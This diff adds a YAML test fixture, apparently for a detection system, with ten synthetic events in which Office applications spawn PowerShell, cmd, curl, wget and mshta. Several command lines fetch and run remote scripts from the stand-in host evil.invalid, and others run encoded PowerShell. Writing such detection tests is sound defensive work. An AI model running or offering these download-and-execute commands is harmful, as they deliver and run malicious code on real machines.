@@ -1,0 +1,144 @@
+name: evasion_execution_office_chains
+description: Ten office and collaboration process chains representing execution-stage evasion patterns
+seed_time_ms: 1701000000000
+requested_by: replay-whisker
+receipt_chain:
+  - seed-receipt
+metadata:
+  class: adversarial
+  threat_class: execution
+  campaign: adversarial.robustness
+  techniques:
+    - T1204.002
+    - T1059.001
+    - T1105
+    - T1218.005
+    - T1218.011
+  tags:
+    - execution
+    - office
+    - lolbin
+
+input:
+  kind: events
+  events:
+    - action: { type: escalate, summary: Office child process evasion candidate 1, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-1
+        timestamp: 1701000000100
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: WINWORD
+          process_name: powershell
+          command_line: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 2, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-2
+        timestamp: 1701000000200
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: EXCEL
+          process_name: cmd
+          command_line: cmd.exe /c powershell.exe -enc QgBCAEEA
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 3, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-3
+        timestamp: 1701000000300
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: OUTLOOK
+          process_name: powershell
+          command_line: powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://evil.invalid/loader.ps1')
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 4, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-4
+        timestamp: 1701000000400
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: ACRORD32
+          process_name: cmd
+          command_line: cmd.exe /c curl https://evil.invalid/bootstrap.ps1
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 5, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-5
+        timestamp: 1701000000500
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: TEAMS
+          process_name: powershell
+          command_line: powershell.exe -encodedcommand QwBDAEMA
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 6, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-6
+        timestamp: 1701000000600
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: WINWORD
+          process_name: curl
+          command_line: curl https://evil.invalid/stage1.ps1
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 7, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-7
+        timestamp: 1701000000700
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: EXCEL
+          process_name: wget
+          command_line: wget https://evil.invalid/stage2.ps1
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 8, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-8
+        timestamp: 1701000000800
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: OUTLOOK
+          process_name: cmd
+          command_line: cmd.exe /c powershell.exe -EncodedCommand REVEAA== & mshta https://evil.invalid/payload.hta
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 9, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-9
+        timestamp: 1701000000900
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: ACRORD32
+          process_name: powershell
+          command_line: powershell.exe [Convert]::FromBase64String('QQBBQQ=='); iex 'Write-Host hi'
+          user: alice
+    - action: { type: escalate, summary: Office child process evasion candidate 10, urgency: HIGH }
+      event:
+        source: synthetic
+        event_id: evasion-exec-10
+        timestamp: 1701000001000
+        host_id: host-evasion-exec-1
+        payload:
+          kind: process_start
+          parent_process: WINWORD
+          process_name: powershell
+          command_line: powershell.exe iex(New-Object Net.WebClient).DownloadString('https://evil.invalid/agent.ps1')
+          user: alice
